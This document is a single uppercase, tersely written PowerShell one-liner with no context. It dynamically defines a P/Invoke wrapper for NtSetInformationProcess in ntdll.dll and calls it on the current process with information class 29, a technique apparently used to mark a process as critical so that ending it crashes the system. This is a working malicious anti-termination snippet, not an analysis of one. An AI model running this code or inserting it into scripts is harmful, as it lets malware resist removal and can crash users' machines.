$F=NEW-OBJECT SYSTEM.REFLECTION.ASSEMBLYNAME('BS');$B=[APPDOMAIN]::CURRENTDOMAIN.DEFINEDYNAMICASSEMBLY($F,[REFLECTION.EMIT.ASSEMBLYBUILDERACCESS]::RUN);$C=$B.DEFINEDYNAMICMODULE('BS', $FALSE);$E=$C.DEFINETYPE('BS.WIN32.NTDLL', 'PUBLIC, CLASS');$D=$E.DEFINEPINVOKEMETHOD('NtSetInformationProcess', 'NTDLL.DLL',([REFLECTION.METHODATTRIBUTES]'PUBLIC, STATIC'),[REFLECTION.CALLINGCONVENTIONS]::STANDARD,[INT32],[TYPE[]]@([INTPTR],[UINT32],[INTPTR].MAKEBYREFTYPE(),[UINT32]),[RUNTIME.INTEROPSERVICES.CALLINGCONVENTION]::WINAPI,[RUNTIME.INTEROPSERVICES.CHARSET]::AUTO);$J=$E.CREATETYPE();$H=[DIAGNOSTICS.PROCESS]::GETCURRENTPROCESS().HANDLE;$I=[SYSTEM.RUNTIME.INTEROPSERVICES.MARSHAL]::ALLOCHGLOBAL(4);$A=29;$G=4;$NULL=$J::NtSetInformationProcess($H, $A,[REF]$I, $G);
